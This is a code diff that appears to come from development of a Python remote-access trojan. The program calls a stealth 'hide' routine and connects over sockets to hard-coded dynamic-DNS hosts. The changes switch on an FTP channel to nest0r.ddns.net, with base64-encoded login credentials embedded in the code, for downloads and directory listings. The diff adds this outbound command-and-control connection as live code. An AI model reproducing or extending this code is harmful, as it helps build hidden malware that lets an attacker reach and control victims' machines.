@@ -26,12 +26,18 @@ class module(object):
 
 	class fileTransferProtocol(object):
 		"""This module is responsible for ftp operations algorithms."""
+		def __init__(self, host, port, user, password):
+			self.host = host
+			self.port = port
+			self.user = str(user).decode('base64')
+			self.password = str(password).decode('base64')
 
 		def connect(self, host, port, user, password):
 			global ftp
 			ftp = ftplib.FTP()
 			ftp.connect(host,port)
 			ftp.login(user,password)
+			print ' [+] FTP: Connected to %s:%s' % (str(host),str(port))
 			return True
 
 		def download(self, fileName):
@@ -50,14 +56,9 @@ class module(object):
 		def listDir():
 			ftp.dir()
 
-		def __init__(self, host, port, user, password):
-			super(ftp, self).__init__()
-			self.host = host
-			self.port = port
-			self.user = str(user).decode('base64')
-			self.password = str(password).decode('base64')
-			if(ftp_connect(self.host, self.port, self.user, self.password) == True):
-				print ' [+] FTP: Connected to %s:%s' % (str(self.user), str(self.port))
+		
+			
+			
 
 
 			
@@ -157,7 +158,13 @@ def main():
 	global debug_mode
 
 	#DEBUG MODE
-	debug_mode = False
+	debug_mode = True
+
+
+	#CONTROLSWITCH
+	socketMode = False
+	ftpMode = True
+
 
 	#START PROGRAM
 	dns_list = ['nest0r.ddns.net','lyriumhideout.ddns.net']
@@ -172,18 +179,19 @@ def main():
 		module.stealth.hide()
 
 
-	#start Socket conn
-	if(debug_mode == False):
-		for dns in dns_list:
-			module.thread.start(module.socket.connect,(dns,p.dns_port))
-	else:
-		for dns in local_list:
-			module.thread.start(module.socket.connect,(dns,p.dns_port))
+	if(socketMode == True):
+		#start Socket conn
+		if(debug_mode == False):
+			for dns in dns_list:
+				module.thread.start(module.socket.connect,(dns,p.dns_port))
+		else:
+			for dns in local_list:
+				module.thread.start(module.socket.connect,(dns,p.dns_port))
 
-	#start FTP conn
-	#if(debug_mode == False):
-		#fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
-
+	if(ftpMode == True):
+		#start FTP conn
+		fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
+		fp.connect(fp.host,fp.port, fp.user, fp.password)
 
 
 
